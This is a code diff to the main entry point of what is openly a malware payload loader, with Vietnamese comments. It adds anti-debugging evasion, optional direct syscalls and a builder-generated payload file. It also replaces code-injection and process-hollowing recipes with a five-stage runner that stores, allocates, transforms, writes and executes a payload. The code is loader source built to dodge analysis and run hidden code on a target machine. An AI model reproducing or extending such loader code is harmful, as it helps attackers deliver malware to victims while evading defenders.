@@ -4,9 +4,13 @@
 #include "core/utils.h"
 
 // Include file tổng hợp các kỹ thuật (Recipes)
-// File này sẽ tự động include các file con như alloc_local.h, exec_thread.h...
-#include "techniques/recipes.h"
+#include "techniques/context.h"
 #include "techniques/0_anti_analysis/anti_debug.h" 
+#include "techniques/runner/T1_storage.h"
+#include "techniques/runner/T2_allocation.h"
+#include "techniques/runner/T3_transformation.h"
+#include "techniques/runner/T4_writing.h"
+#include "techniques/runner/T5_execution.h"
 
 // File này được sinh bởi builder, không edit thủ công
 #include "payload_data.h"
@@ -18,24 +22,28 @@ DWORD g_ssn_NtWaitForSingleObject = 0;
 
 // --- Entry Point ---
 extern "C" int main() {
-    
-    DEBUG_MSG("Start", "Hello from malware");
 
+    DEBUG_MSG("Start", "Technique runner start");
 
-    #ifdef USE_DIRECT_SYSCALLS
-        if (!InitializeSyscalls()) return 1;
-    #endif
+#ifdef USE_DIRECT_SYSCALLS
+    if (!InitializeSyscalls()) return 1;
+#endif
 
-    // Stage 0: Anti-Analysis (Global Check)
-    #ifdef EVASION_CHECKS_ENABLED
-        if (IsDebugged()) return 1;
-    #endif
+#ifdef EVASION_CHECKS_ENABLED
+    if (IsDebugged()) return 1;
+#endif
 
-    #ifdef INJECTION_CLASSIC
-        Recipe_Classic_Injection();
-    #elif defined(INJECTION_HOLLOWING)
-        // Recipe_Process_Hollowing();
-    #endif
+    TechniqueContext ctx = {0};
+
+    Run_T1_Storage(&ctx);
+
+    Run_T2_Allocation(&ctx);
+
+    Run_T3_Transform(&ctx);
+
+    Run_T4_Write(&ctx);
+
+    Run_T5_Execute(&ctx);
 
     return 0;
 }
